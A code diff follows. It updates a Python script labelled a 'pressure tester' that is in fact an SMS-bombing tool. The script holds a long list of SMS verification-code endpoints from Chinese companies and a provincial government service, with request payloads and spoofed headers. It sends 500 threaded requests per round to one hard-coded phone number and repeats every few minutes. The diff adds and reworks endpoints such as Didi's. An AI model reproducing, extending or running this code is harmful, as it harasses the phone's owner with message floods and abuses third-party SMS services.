@@ -34,7 +34,9 @@ class PressureTester:
             ("快递100", "https://p.kuaidi100.com/xcx/sms/sendcode", "POST", {"name": p, "validcode": ""}, False, lambda r: r.status_code == 200, None),
             ("鑫汇融资", "http://apiyd.xinhuirongzi.com/user/get-sms-code", "POST", {"mobile": p}, True, lambda r: r.json().get("code") == 200, {"package": "com.dsrz.qianjia", "os": "android"}),
             
-            # --- 新增整合接口 (部分重构以适应自动化) ---
+            # --- 新增整合接口 (含滴滴、惠农网) ---
+            ("滴滴出行", "https://epassport.diditaxi.com.cn/passport/login/v5/codeMT", "POST", f"cell={p}&appid=35011&code_type=1&sec_session_id=none", False, lambda r: r.json().get("errno") == 0, {"Content-Type": "application/x-www-form-urlencoded", "Mpxlogin-Ver": "5.5.1", "secdd-authentication": f"v1:{ts}"}),
+            ("惠农网", f"https://stdch5.huinongyun.cn/api-uaa/validata/smsCode/{p}/voc", "GET", None, False, lambda r: r.status_code == 200, None),
             ("原子科技", "https://mobilev2.atomychina.com.cn/api/user/web/login/login-send-sms-code", "POST", {"mobile": p, "captcha": "1111", "token": "1111", "prefix": 86}, True, lambda r: r.json().get("code") == 200, None),
             ("智慧云行", "https://apibus.zhihuiyunxing.com/api/v1/common/captcha/send/sms", "POST", f"phone={p}&random=31540959202205610&userType=1&type=PASSENGER_LOGIN_CODE", False, lambda r: r.json().get("code") == 200, {"Content-Type": "application/x-www-form-urlencoded"}),
             ("汽车之家", "https://yczj.api.autohome.com.cn/cus/v1_0_0/api/msite/login/sendVerificationCode", "POST", {"mobile": p, "isDianPing": True, "platform": 4, "version": "2.2.30"}, True, lambda r: r.json().get("returncode") == 0, None),
@@ -48,7 +50,6 @@ class PressureTester:
             ("云住科技", "https://prod.driver.yunzhukj.cn/terminal/api/basics/sendMobileCode", "POST", {"mobile": p, "openId": "oCoHa5BPKmmNt0i5YNY-gA_Xrrio", "sendType": "registerS-kQZWzK"}, True, lambda r: r.json().get("code") == 200, None),
             ("WFJ电商", "https://api.wfjec.com/mall/user/sendRegisterSms", "PUT", {"mobile": p}, True, lambda r: r.json().get("code") == 200, None),
             ("CADF商城", "https://shopapi.cadf.top/user-center/frontend/user/login/getVerifyCode", "GET", {"mobile": p, "smsType": "phoneLogin"}, False, lambda r: r.json().get("code") == 200, None),
-            ("滴滴出行", "https://epassport.diditaxi.com.cn/passport/login/v5/codeMT", "POST", f"cell={p}&appid=121015&role=2470&code_type=1", False, lambda r: r.json().get("errno") == 0, {"Content-Type": "application/x-www-form-urlencoded"}),
             ("德邦物流", "https://www.deppon.com/ndcc-gwapi/messageService/eco/message/sendSmsMessage", "POST", {"mobile": p, "messageType": "login", "sysCode": "WECHAT_MINI"}, True, lambda r: r.json().get("success") is True, None),
             ("途虎养车", "https://cl-gateway.tuhu.cn/cl-user-auth-login/login/getVerifyCode", "POST", {"mobile": p, "channel": "wechat-miniprogram", "nationCode": "86"}, True, lambda r: r.json().get("isSuccess") is True, None),
             ("云南12345", "https://12345lm.www.yn.gov.cn:9001/WebPortal/Api/BanJian/SendValidateSmsCodeForWeChat", "POST", f"mobile={p}&sid=PyiYE2JNv_ul25jNu-fPrDaS", False, lambda r: r.json().get("Success") is True, {"Content-Type": "application/x-www-form-urlencoded"}),
@@ -84,14 +85,12 @@ class PressureTester:
             else: # POST
                 res = self.session.post(url, json=data if is_json else None, data=None if is_json else data, headers=headers, timeout=6, verify=False)
 
-            # 统一状态判断逻辑
             if res.status_code in [200, 201, 204]:
                 if check_func(res):
                     with self.lock:
                         self.success_count += 1
                     status = "✅"
             
-            # 缩减输出内容，保持简洁
             resp_text = res.text[:20].replace('\n', '')
             print(f"[{idx:03d}] {status} {name: <6} | 状态: {res.status_code} | 响应: {resp_text}")
         except Exception as e:
@@ -110,12 +109,10 @@ class PressureTester:
         print(f"📈 任务总结 | 成功: {self.success_count}/{count} | 耗时: {duration:.1f}s")
 
 if __name__ == "__main__":
-    # --- 配置区 ---
     PHONE = "13599888558"
-    TOTAL_REQUESTS = 500  # 单轮请求数
-    MAX_THREADS = 20      # 并发线程数
-    INTERVAL = 250        # 轮询间隔 (秒)
-    # --------------
+    TOTAL_REQUESTS = 500
+    MAX_THREADS = 20
+    INTERVAL = 250
 
     engine = PressureTester(PHONE)
     print(f"🔥 全能接口测试引擎已就绪")
@@ -125,12 +122,9 @@ if __name__ == "__main__":
             engine.success_count = 0
             curr_time = time.strftime("%H:%M:%S", time.localtime())
             print(f"\n>>> [{curr_time}] 任务循环开始...")
-            
             engine.start(count=TOTAL_REQUESTS, threads=MAX_THREADS)
-            
             print(f"💤 休眠中... 下一轮任务在 {INTERVAL//60} 分钟后开始")
             time.sleep(INTERVAL)
-            
     except KeyboardInterrupt:
         print("\n👋 任务已由用户停止。")
     except Exception as e:
